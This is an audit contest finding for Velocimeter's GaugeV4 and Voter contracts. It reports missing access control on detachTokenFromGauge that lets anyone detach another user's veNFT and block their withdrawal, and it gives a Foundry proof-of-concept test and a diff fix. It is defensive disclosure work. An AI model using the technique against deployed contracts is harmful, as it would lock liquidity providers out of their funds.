High Hotpink Dove

High

# Malicious user can disrupt the users' withdrawal

## Summary
`Voter::detachTokenFromGauge` has lack of access control and anyone can detach the users' veNFT from deposited assets in gaugeV4 

## Vulnerability Detail
Let's assume  LP attaches its deposited assets to a veNFT and after a while, a malicious user detaches LP's  veNFT, hence LP cannot withdraw its assets

**Coded PoC:**
plz add this test to gaugeV4.t.sol
```solidity
    function testDistruptedUsersWithdraw() external {
        vm.startPrank(address(owner));
        washTrades();
        flowDaiPair.approve(address(gauge),1100);
        vm.mockCall(gauge._ve(), 
        abi.encodeWithSelector(IVotingEscrow.ownerOf.selector, 1),
        abi.encode(address(owner)));
        gauge.deposit(1000, 1);

        vm.stopPrank();
        address alice = makeAddr("alice");
        voter.detachTokenFromGauge(1, address(owner));
        
        vm.startPrank(address(owner));
        gauge.deposit(100, 1);
        vm.expectRevert();
        gauge.withdrawAll();
    }
```

## Impact
lps cannot withdraw their assets from gaugeV4

## Code Snippet
https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/GaugeV4.sol#L539

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Voter.sol#L444

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L1192

## Tool used

Manual Review

## Recommendation
```diff
function detachTokenFromGauge(uint tokenId, address account) external {
+        require(isGauge[msg.sender]);
+        require(isAlive[msg.sender]);
        if (tokenId > 0) IVotingEscrow(_ve).detach(tokenId);
        emit Detach(account, msg.sender, tokenId);
    }
```
